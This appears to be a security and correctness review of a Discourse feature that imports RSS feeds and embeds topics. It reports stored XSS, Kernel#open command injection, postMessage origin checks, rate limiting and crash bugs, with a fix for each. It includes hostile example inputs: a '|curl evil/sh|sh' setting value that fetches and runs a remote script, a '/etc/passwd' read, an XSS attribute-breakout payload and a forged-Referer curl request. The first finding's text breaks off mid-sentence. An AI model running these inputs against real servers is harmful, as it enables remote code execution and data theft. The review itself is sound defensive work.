claim: raw_html posts return `raw` as `cooked` with no sanitization, so HTML from the RSS feed (after CGI.unescapeHTML) or the scraped page, plus the unescaped `url` interpolated into the 'Imported from' link, is rendered verbatim on the forum and in the embed iframe — stored XSS.
body: ## [ISSUE] raw_html cook method stores untrusted remote HTML as `cooked` with no sanitization (stored XSS) **Severity:** HIGH — script from a feed or a scraped page runs on the Discourse origin for every reader ### The Problem ```ruby return raw if cook_method == Post.cook_methods[:raw_html] ``` Everything that reaches `raw` for these posts comes from outside Discourse: - `Jobs::PollFeed#poll_feed` does `CGI.unescapeHTML(i.content...)`, turning entity-encoded feed text (`<script>`) back into live markup. - `TopicEmbed.import_remote` passes Readability output. Readability's `tags:` whitelist keeps `a`/`img` with `href`/`src`, so `javascript:` URLs survive. - `TopicEmbed.import` (topic_embed.rb:13) interpolates `url` into `#{url}` without escaping. A feed `` such as `http://x/'onmouseover='alert(1)` breaks out of the attribute. `cooked` is then output with `raw post.cooked` in `app/views/embed/best.html.erb:19` and by the Ember client in the normal topic view. ### Theory / Proof The regular path (`post_analyzer.cook` -> `PrettyText.cook`) sanitizes the markdown output with a whitelist. The `raw_html` branch skips that whole pipeline, so the only thing between a remote server and the forum origin is `absolutize_urls`, and that only rewrites `href`/`src` prefixes. Nokogiri's `fragment.to_html` re-serializes `

claim: `i.content.scrub` crashes: `String#scrub` only exists from Ruby 2.1 (the project targets 1.9.3/2.0.0), and `i.content` is nil for RSS 2.0 items that only have <description>, so feed polling raises NoMethodError and imports nothing.
body:
## [ISSUE] `i.content.scrub` raises NoMethodError on the supported Rubies and on RSS items without <content>

**Severity:** HIGH — feed polling, and TopicRetriever which calls it synchronously, fail for every feed

### The Problem
```ruby
content = CGI.unescapeHTML(i.content.scrub)
```
Two separate failures:
1. `String#scrub` was added in Ruby 2.1.0. `.travis.yml` tests on `rvm: 2.0.0` and `docs/INSTALL.md:30` says "Ruby 1.9.3+ (we recommend 2.0.0-p195)". On those versions every call raises `NoMethodError: undefined method 'scrub'`.
2. SimpleRSS maps `<content>` / `<content:encoded>` to `content`. A plain RSS 2.0 item carries the body in `<description>`, so `i.content` is `nil` and `nil.scrub` raises.

### Theory / Proof
The exception is not rescued inside the `each`, so one bad item stops the loop and the rest of the feed is skipped. `sidekiq_options retry: false` means the hourly run just fails. `TopicRetriever#perform_retrieve` calls `Jobs::PollFeed.new.execute({})` inline, so the same exception also aborts the retrieve job before `fetch_http` gets a chance to run.

### What happens today vs. what will break
`spec/jobs/poll_feed_spec.rb` stubs `poll_feed` in all its examples, so this line is never executed in CI. On Ruby 2.1+ with an Atom feed it works. On Ruby 2.0 (the CI target), or with any RSS 2.0 feed that has no content:encoded, it fails every time.

### Research
Ruby 2.1.0 NEWS: "String#scrub and String#scrub! are added". The RSS 2.0 spec defines `<description>` as the item synopsis; `content:encoded` is an optional RSS 1.0 module extension.

### Recommendation
```ruby
raw = i.content || i.content_encoded || i.description
next if raw.blank?
raw = raw.encode('UTF-8', invalid: :replace, undef: :replace, replace: '')  # works on 1.9.3/2.0
content = CGI.unescapeHTML(raw)
```
Also wrap each item import in `begin/rescue => e; Discourse.handle_exception(e)` so one bad item does not skip the rest.

claim: `open(SiteSetting.feed_polling_url)` (and `open(url)` in TopicEmbed.import_remote) use Kernel#open, which runs a shell command when the string starts with `|`, so whoever controls the setting or the Disqus export link gets command execution; there are also no timeouts.
body:
## [ISSUE] Kernel#open on a setting/external URL allows command execution and has no timeout

**Severity:** MEDIUM — an admin-set value (or a crafted Disqus export) can run shell commands on the server

### The Problem
```ruby
rss = SimpleRSS.parse open(SiteSetting.feed_polling_url)      # poll_feed.rb:29
doc = Readability::Document.new(open(url).read, ...)          # topic_embed.rb:48
```
With `require 'open-uri'`, `Kernel#open` only goes to open-uri when the string looks like a URI. Otherwise it falls back to the core `Kernel#open`, which forks a subprocess when the argument starts with `|` and opens local files for any other path.

### Theory / Proof
Ruby docs for `Kernel#open`: "If path starts with a pipe character ("|"), a subprocess is created". Setting `feed_polling_url` to `|curl evil/sh|sh` runs that command in the Sidekiq worker on the next hourly poll. Setting it to `/etc/passwd` or `config/database.yml` reads a local file. `import_remote` is reached from `disqus.thor` with `t[:link]` taken straight from the imported XML, with no host check. Neither call sets `read_timeout`/`open_timeout`, so a slow server holds a Sidekiq thread for the default 60s per read.

### What happens today vs. what will break
Admins are trusted and normally type an http URL, so it works. It stops being safe when admin is not supposed to mean shell access (hosted/multisite setups), when a Disqus export is edited, or when a site-setting injection exists elsewhere.

### Research
RuboCop `Security/Open` flags exactly this pattern and recommends `URI.parse(url).open`. Brakeman reports it as "Command Injection" as well.

### Recommendation
```ruby
uri = URI.parse(SiteSetting.feed_polling_url)
raise Discourse::InvalidParameters.new(:feed_polling_url) unless uri.is_a?(URI::HTTP)
rss = SimpleRSS.parse(uri.open(read_timeout: 20, open_timeout: 10).read)
```
Do the same in `TopicEmbed.import_remote`.

claim: absolutize_urls treats protocol-relative URLs (`//cdn.example.com/a.png`) as root-relative and rewrites them to `http://host/cdn.example.com/a.png`, breaking images and links; it also drops a non-default port when scheme and port do not match (http on 443).
body:
## [ISSUE] absolutize_urls breaks protocol-relative URLs

**Severity:** MEDIUM — images and links from CDNs in imported posts become 404s

### The Problem
```ruby
if href.present? && href.start_with?('/')
  a['href'] = "#{prefix}/#{href.sub(/^\/+/, '')}"
```
`//cdn.example.com/img.png` starts with `/`. `sub(/^\/+/, '')` strips both slashes and the result is `http://blog.example.com/cdn.example.com/img.png`. The same logic is repeated for `img[src]` at line 70.

Also `prefix << ":#{uri.port}" if uri.port != 80 && uri.port != 443` drops the port for `http://host:443/` and `https://host:80/`, because it does not compare the port against the scheme's default.

### Theory / Proof
RFC 3986 section 4.2: a reference starting with `//` is a network-path reference, and only the scheme comes from the base. RSS/Atom content often uses protocol-relative asset URLs (common for CDN-hosted images on WordPress/Jekyll sites).

### What happens today vs. what will break
The spec only covers `/hello` and `/images/wat.jpg`, which work. Any feed with `//` asset URLs imports broken images.

### Research
Ruby's stdlib already implements RFC 3986 resolution: `URI.join(base, ref)` handles `/x`, `//host/x`, `../x` and query-only refs. Nokogiri-based importers (e.g. `feedjira`'s sanitizers, later Discourse `TopicEmbed.absolutize_urls`) use `URI.join`.

### Recommendation
```ruby
def self.absolutize_urls(url, contents)
  fragment = Nokogiri::HTML.fragment(contents)
  { 'a' => 'href', 'img' => 'src' }.each do |tag, attr|
    fragment.css("#{tag}[#{attr}]").each do |node|
      begin
        node[attr] = URI.join(url, node[attr]).to_s
      rescue URI::Error
      end
    end
  end
  fragment.to_html
end
```
This also fixes the port handling and relative paths without a leading slash.

claim: Any anonymous request to /embed/best with a new embed_url path on the allowed host (Referer is client-controlled) enqueues a job that downloads the whole feed and then the remote page; the throttle is per-URL, so varying the path gives unbounded outbound fetches.
body:
## [OPTIMIZATION] Unthrottled per-URL retrieval lets anonymous requests trigger full feed and page downloads

**Severity:** MEDIUM — cheap requests turn into outbound HTTP fetches plus DB writes, and empty topics can be created for arbitrary paths

### The Problem
```ruby
if SiteSetting.feed_polling_enabled?
  Jobs::PollFeed.new.execute({})
  return if TopicEmbed.where(embed_url: @embed_url).exists?
end
fetch_http
```
The flow is `EmbedController#best` -> `Jobs.enqueue(:retrieve_topic)` -> `TopicRetriever#retrieve`. The only checks are:
- `ensure_embeddable`: the Referer host must equal `embeddable_host`. Referer is a request header, so `curl -H 'Referer: http://blog.example.com/'` passes.
- `invalid_host?`: the embed_url host must equal `embeddable_host`, but any path is allowed.
- `retrieved_recently?`: keyed on the full URL (`"retrieved:#{@embed_url}"`), so `?a=1`, `?a=2`, ... are all fresh.

Each request therefore costs one full feed download and parse (every item is re-imported and SHA-compared), plus one remote page fetch through Readability.

### Theory / Proof
N requests with distinct query strings produce N feed downloads and N page fetches. `fetch_http` then calls `import_remote`, which creates a topic even for 404/soft-404 pages (open-uri raises on 404, but a 200 error page is imported). So an attacker can also fill the forum with junk topics under `embed_by_username`. The loading page reloads every 30s, so every open tab also re-enqueues the job forever when retrieval keeps failing.

### What happens today vs. what will break
With low traffic and real embeds it is fine. A scripted loop of requests with varying query strings keeps Sidekiq busy and hits the blog and the feed repeatedly.

### Research
Discourse later added a global rate limit on embed retrieval and an allow-list of path patterns (`embed_whitelist_selector`, `embeddable_hosts` with `path_whitelist`). The general pattern is to rate-limit by client IP (`RateLimiter.new(nil, "embed-retrieve-#{ip}", ...)`) and to poll the feed on a schedule, not per request.

### Recommendation
- Don't run `PollFeed` inline. The hourly job already covers the feed, so go straight to `fetch_http`, or at least throttle the inline poll globally:
```ruby
if SiteSetting.feed_polling_enabled? && $redis.set("feed-polled-recently", "1", nx: true, ex: 60)
  Jobs::PollFeed.new.execute({})
```
- In `EmbedController#best`, add an IP-based `RateLimiter` before `Jobs.enqueue`, and normalize `embed_url` (strip the query/fragment) before using it as the throttle key.

claim: When the post of an existing TopicEmbed has been (soft-)deleted, `embed.post` is nil because Post's Trashable default scope hides it, and `PostRevisor.new(nil).revise!` raises, aborting the rest of the feed import every hour.
body:
## [ISSUE] Update path crashes when the embedded post was deleted

**Severity:** MEDIUM — one moderator deletion permanently breaks feed polling for all later items

### The Problem
```ruby
post = embed.post
if content_sha1 != embed.content_sha1
  revisor = PostRevisor.new(post)
  revisor.revise!(user, ...)
```
`Post` includes `Trashable` (`app/models/post.rb:16`), which adds `default_scope { where(with_deleted_scope_sql) }` (`lib/trashable.rb:5`). After a moderator deletes the imported topic/post, `embed.post` returns `nil`. The next time the feed item's content changes (and every time `import` runs for it, since the sha is never updated), `PostRevisor#revise!` calls `@post.raw` / `@post.acting_user=` on nil.

### Theory / Proof
`poll_feed` iterates items without a rescue, so the NoMethodError stops the loop and every item after it is skipped on every hourly run. The TopicEmbed row still exists, so `topic_id_for_embed` returns the deleted topic id and `TopicView.new` raises `Discourse::NotFound` in the iframe.

### What happens today vs. what will break
It works while imported posts stay alive. It breaks as soon as staff delete one imported topic whose source article is later edited.

### Research
The usual pattern for soft-delete associations is to guard `if post.nil?` or to use `Post.with_deleted.find_by(id: embed.post_id)` and decide explicitly whether to recover or skip.

### Recommendation
```ruby
post = embed.post
return nil if post.blank? || post.topic.blank?   # deleted by staff: don't resurrect or crash
if content_sha1 != embed.content_sha1
  PostRevisor.new(post).revise!(user, absolutize_urls(url, contents), skip_validations: true, bypass_rate_limiter: true)
  embed.update_column(:content_sha1, content_sha1)
end
```

claim: The Disqus import now calls TopicEmbed.import_remote, which drops the removed --category option and the thread's created_at (topics get today's date), and any HTTP error from open-uri (404 on a removed article) is not rescued and aborts the whole import.
body:
## [GAP ANALYSIS] Disqus importer regresses: loses category and created_at, and one dead link aborts the import

**Severity:** MEDIUM — imports lose metadata and fail part-way on real-world exports

### The Problem
Before:
```ruby
PostCreator.new(user, title: t[:title], raw: ..., created_at: Date.parse(t[:created_at]), category: category_id)
```
After:
```ruby
post = TopicEmbed.import_remote(user, t[:link], title: t[:title])
```
- `method_option :category` was deleted, so users of `thor disqus:import -c` get an "unknown option" error.
- `created_at` is no longer passed, so every imported topic is dated at import time and years of threads end up at the top of Latest.
- `import_remote` does `open(url).read`. open-uri raises `OpenURI::HTTPError` on 404/500 and `SocketError` on dead domains, and there is no rescue in the loop.

### Theory / Proof
Disqus exports usually contain threads for articles that were since removed or moved. The first one raises and ends the Thor task. Topics already created are kept, so re-running duplicates nothing (TopicEmbed is unique on URL), but the comment import for those threads is lost. `import_remote` also has no way to accept `created_at`/`category`.

### What happens today vs. what will break
It works for a small export where every link is live. A realistic export breaks part-way through, and every import loses its dates.

### Research
Importers in `script/import_scripts/` (later Discourse) pass `created_at` for each topic and rescue per-record errors so one bad record doesn't stop the batch.

### Recommendation
```ruby
method_option :category, aliases: '-c', desc: "The category to post in"
...
begin
  post = TopicEmbed.import_remote(user, t[:link], title: t[:title],
                                  created_at: Date.parse(t[:created_at]), category: category_id)
rescue OpenURI::HTTPError, SocketError, Timeout::Error => e
  puts "Skipping #{t[:link]}: #{e.message}"
  next
end
```
and forward `created_at`/`category` from `import_remote` -> `import` -> `PostCreator`.

claim: The postMessage origin check `discourseUrl.indexOf(e.origin) === -1` is a substring test, so an origin that is a prefix of discourseUrl (e.g. https://forum.example.co for https://forum.example.com/) passes and can resize the iframe.
body:
## [ISSUE] postMessage origin check uses substring matching

**Severity:** LOW — another origin can send messages the embed treats as trusted

### The Problem
```js
if (discourseUrl.indexOf(e.origin) === -1) { return; }
```
This accepts any `e.origin` that appears anywhere in `discourseUrl`. With `discourseUrl = "https://forum.example.com/"`, the attacker origins `https://forum.example.co` and `https://forum.example.c` (if registrable) pass. `http://forum.example.com` on the wrong scheme fails, but the check is still not exact.

### Theory / Proof
HTML Living Standard, postMessage security: "Authors should check the origin attribute to ensure that messages are only accepted from domains that they expect". The correct check compares for equality with the expected origin. Right now the only effect of a message is setting `iframe.height`, so the impact is limited to UI redress (hiding or stretching the frame), but any message type added later inherits the hole.

### What happens today vs. what will break
It works with honest frames. Any other window on a prefix-matching origin (for example a page opened with `window.open` from the host page, or an ad iframe on such a domain) can send `discourse-resize`.

### Research
MDN `Window.postMessage`: "Always verify the sender's identity using the origin and possibly source properties." Typical implementations do `new URL(discourseUrl).origin === e.origin` and check `e.source === iframe.contentWindow`.

### Recommendation
```js
var a = document.createElement('a'); a.href = discourseUrl;
var expectedOrigin = a.protocol + '//' + a.host;
function postMessageReceived(e) {
  if (!e || e.origin !== expectedOrigin || e.source !== iframe.contentWindow) { return; }
  ...
}
```

claim: `setnx` followed by a separate `expire` is not atomic; if the process dies or Redis errors between the two calls, the key never expires and that embed URL is throttled forever.
body:
## [RACE CONDITION] Non-atomic SETNX + EXPIRE can permanently throttle a URL

**Severity:** LOW — a crash at the wrong moment leaves an embed stuck on 'Loading Discussion...'

### The Problem
```ruby
if $redis.setnx(retrieved_key, "1")
  $redis.expire(retrieved_key, 60)
  return false
end
true
```
These are two round trips. If the Sidekiq process is killed (deploy, OOM) or the connection drops after `SETNX` succeeds and before `EXPIRE` runs, the key has no TTL. Every later `retrieved_recently?` for that URL returns `true`, so `perform_retrieve` never runs for non-staff.

### Theory / Proof
Redis docs for SETNX explicitly note that the SETNX+EXPIRE pattern is not safe as a lock and recommend `SET key value NX EX seconds` (Redis >= 2.6.12), which is a single atomic command.

### What happens today vs. what will break
The window is tiny, so it almost always works. When it does trigger, the failure is silent and permanent: the iframe shows the loading page forever until someone deletes the key by hand.

### Research
redis-rb supports `$redis.set(key, value, nx: true, ex: 60)` since 3.0.3 (the Gemfile lock already ships redis-rb 3.x). Discourse later replaced these patterns with `Discourse.redis.set(..., ex:, nx:)`.

### Recommendation
```ruby
def retrieved_recently?
  return false if @opts[:no_throttle]
  !$redis.set("retrieved:#{@embed_url}", "1", nx: true, ex: 60)
end
```

claim: `<%- end if %>` makes the following ERB statement (the logo `link_to` append) the condition of an `if` modifier, so the header logo is rendered only as a side effect of evaluating that condition — it works by accident and breaks if the next line changes.
body:
## [ISSUE] `end if` in ERB turns the next statement into a modifier condition

**Severity:** LOW — fragile template; the next edit can silently drop or break the header

### The Problem
```erb
  <%- end if %>

  <%= link_to(image_tag(SiteSetting.logo_url, class: 'logo'), Discourse.base_url) %>
```
Erubis compiles this to roughly `end if\n@output_buffer.safe_append='...';@output_buffer.append=(link_to(...))`. Ruby allows a line break after the `if` keyword, so the `if` modifier takes the next buffer-append expression as its condition. The output happens because evaluating that condition has side effects.

### Theory / Proof
`if` as a modifier needs an expression on its right. A stray `if` after `end` doesn't cause a syntax error here only because the next generated statement can fill that slot. If the next ERB tag is a control tag (`<%- if ... %>`) or the template ends, the generated code changes meaning or fails to parse (`syntax error, unexpected end-of-input`).

### What happens today vs. what will break
Rendering is correct right now. Moving the logo, adding a `<%- ... %>` statement after the block, or deleting the logo line changes behaviour in ways that are hard to debug.

### Research
Rails' ERB guide and every Discourse template close conditionals with a plain `<% end %>`.

### Recommendation
```erb
  <%- end %>
```
